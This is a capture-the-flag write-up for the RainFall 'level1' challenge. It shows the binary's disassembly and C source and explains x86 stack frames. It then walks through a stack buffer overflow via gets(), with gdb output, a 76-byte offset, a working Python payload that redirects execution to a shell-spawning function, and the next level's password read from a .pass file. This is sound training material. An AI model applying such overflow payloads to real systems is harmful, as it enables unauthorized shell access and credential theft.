# Source Code in Assembly

```asm
   <run>
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,ds:0x80497c0
   0x0804844f <+11>:    mov    edx,eax
   0x08048451 <+13>:    mov    eax,0x8048570
   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret

   <main>
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```

# source Code in C

```c
int run()
{
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  return system("/bin/sh");
}

int  main()
{
  char s[64];

  gets(s);
  return 0;
}
```

# Before all
### How function call hapen in asm

Below is a simplified diagram and explanation of the x86 function call mechanism, focusing on the stack memory layout, including how **EBP** and **EIP** are used.

```plaintext
Low Memory Addresses
      ┌────────────────────────────────────┐  <-- ESP (Stack Pointer)
    ^ |                                    |
    | │ Current Function Local Variables   │  <-- Space allocated for variables used within the function.
 S  | |                                    |
 t  | └────────────────────────────────────┘  <-- EBP (Base Pointer)
 a  | ┌────────────────────────────────────┐
 c  | │ Saved old Base Pointer (EBP)       │  <-- Stores the previous frame pointer to restore the caller's stack frame.
 k  | └────────────────────────────────────┘
    | ┌────────────────────────────────────┐
 G  | │ Return Address (EIP)               │  <-- Holds the address to return to after the function finishes.
 r  | └────────────────────────────────────┘
 o  | ┌────────────────────────────────────┐
 w  | │ Function Parameters                │  <-- Arguments passed to the function (if any).
 i  | └────────────────────────────────────┘
 n  | ┌────────────────────────────────────┐
 g  | │ Previous Function Local Variables  │  <-- Space allocated for variables used within the function.
      └────────────────────────────────────┘
High Memory Addresses
```

### How It Works:
1. **Function Call (`call` instruction):**
   - **EIP (Return Address):**  
     When a function is called, the CPU pushes the address of the next instruction (EIP) onto the stack. This saved EIP ensures that after the function executes, control returns to the right place in the caller.

2. **Function Prologue:**
   - **Saving EBP:**  
     The first instruction inside a function is usually `push ebp`. This saves the current base pointer so that it can be restored later.  
   - **Establishing a New Stack Frame:**  
     After saving EBP, the instruction `mov ebp, esp` sets the base pointer for the current function. This creates a new frame for the function, making it easier to reference parameters and local variables.

3. **Local Variables and Parameters:**
   - **Parameters:**  
     The parameters are already on the stack (above the saved EBP) when the function is called.
   - **Local Variables:**  
     The function typically allocates space for local variables by subtracting a value from `esp` (e.g., `sub esp, local_size`).

4. **Function Epilogue:**
   - Before returning, the function will restore the previous EBP and then use the saved EIP to jump back to the caller.

### Quick Summary:
- **EIP:**  
  Holds the return address—ensuring the program continues from the correct point after the function completes.
- **EBP:**  
  Used to set up and manage the current function's stack frame. Saving the old EBP helps in returning to the caller's frame correctly.

# Exploit
Now we know that *EIP* is stored in stack after Base Pointer (ebp+0x4), our goal is override old EBP with run function or any other malicious code instead of original caller function.

How can we do that, we have `gets(s);` that read from stdin to a buffer (`s`) variable allocated on stack, we know that gets vulnerable to overflow.

So we can bypass len of `s` (64) allocated on stack to override **EIP**.
### Before override (Normal Behaviour)
```gdb
Breakpoint 1, 0x08048483 in main ()
gdb-peda$ x/wx $ebp+0x4  <<-- EIP location on the stack
0xbffff6bc:     0xb7e454d3  <<-- EIP value
gdb-peda$ x/3i 0xb7e454d3 <<-- EIP instructions
   0xb7e454d3 <__libc_start_main+243>:  mov    DWORD PTR [esp],eax
   0xb7e454d6 <__libc_start_main+246>:  call   0xb7e5ebe0 <exit>
   0xb7e454db <__libc_start_main+251>:  xor    ecx,ecx
```

We see EIP points back to `__libc_start_main` function which is the caller of `main`

### After override

```gdb
Breakpoint 2, 0x08048495 in main ()
gdb-peda$ x/wx $ebp+0x4  <<-- EIP location on the stack
0xbffff71c:     0x63413563  <<-- EIP value
```

The EIP value was changed, we can control the EIP by overriding them.

With help of **Buffer overflow pattern offset generator** we can get exact offset, in this case is 76.

So our Payload is 76 * 'a' + 'run function address <0x08048444> ' (address shall be in Little-Endianness)

```
level1@RainFall:~$ (python -c "print 'a' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

